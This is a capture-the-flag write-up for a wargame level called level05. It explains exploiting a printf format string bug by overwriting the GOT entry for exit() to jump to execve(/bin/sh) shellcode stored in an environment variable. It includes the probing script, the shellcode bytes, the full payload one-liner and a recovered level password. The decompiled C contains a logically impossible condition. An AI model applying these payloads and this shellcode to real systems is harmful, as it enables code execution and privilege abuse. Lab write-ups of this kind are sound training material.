## level05 (format string vulnerability with GOT overwrite)
```clike!
int main()
{
    int count = 0;
    char inputbuf[?];
    
    fgets(inputbuf, 100, stdin);
    count = 0;
    while(strlen(inputbuf) > count)
    {
        if (inputbuf[count] <= 64 && inputbuf[count] > 90)
        {
            ++count;
            continue;
        }
        else
        {
            inputbuf[count] = inputbuf[count] ^ 32;
            ++count;
        }
    }
    printf(inputbuf);
    exit(0);
}
```

In the last two lines, we see a **printf call to user input**, which indicates a format string vulnerability. We also noticed that the program calls `exit()` and its complete and not return, which means we are enable to overwrite the EIP, and had to overwrite the GOT for `exit()` instead. 

We also noticed that the program decapitalizes any characters in the input buffer, so that is something to take note of. The first step would be to find the offset of the printf stack address to the contents of the first printf argument. I have made a script to go through the stack to display its contents

```
cat << EOF > /tmp/test.py
import os
import sys
for i in range(1, 42, 1) :
    os.system("echo '' > /tmp/output; echo 'iiii %{}\$p' | /home/users/level05/level05 >> /tmp/output".format(i))
    output = open('/tmp/output', 'r').read()
    sys.stdout.write("{} - ".format(i))
    sys.stdout.write(output[1:])
EOF

python /tmp/test.py
```

As we can see the contents are at **the 10th `%p`**. This is important because we will be putting our GOT address here to be read, and overwritten using `%n`. To locate the GOT address for `exit()`, we can check the relocation entries using `objdump -R ./level05` and we can see its `080497e0`. So our new input should be pointing to that address and printing it out for now. **We also should replace `%p` with `%hhn` so the system will write to that address** on how many bytes we have printed

```
python -c "print '\x08\x04\x97\xe0'[::-1] + 'B' * 12 + '%10\$hhn'" > /tmp/level05
./level05 < /tmp/level05
```

As we can see, we have successfully written over the GOT. So we just need to replace this with a pointer to the shellcode, which I will put in the environment variable.
![image](https://hackmd.io/_uploads/rJLq0Q2Ip.png)

The shellcode will be a simple `execve(/bin/sh)` I found [here](https://shell-storm.org/shellcode/). I will be exporting this in the environment variable and we will be getting the address via GDB. As we can see, our address is `0xffffd85e` but we have a NOP sled, so let make it safer by assuming its  `0xffffd87e`

```
export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
```
![image](https://hackmd.io/_uploads/ryPQ64nUT.png)

With this information, we can now construct our payload like so:
```
0x080497e0 - d87e (55414 bytes)
0x080497e2 - ffff (10113 bytes from last)
```

```
(python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55414x' + '%10\$hn' + '%10113x' + '%11\$hn'" ; cat)| ./level05
```

And we got our password `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
![image](https://hackmd.io/_uploads/ByxB0VhI6.png)

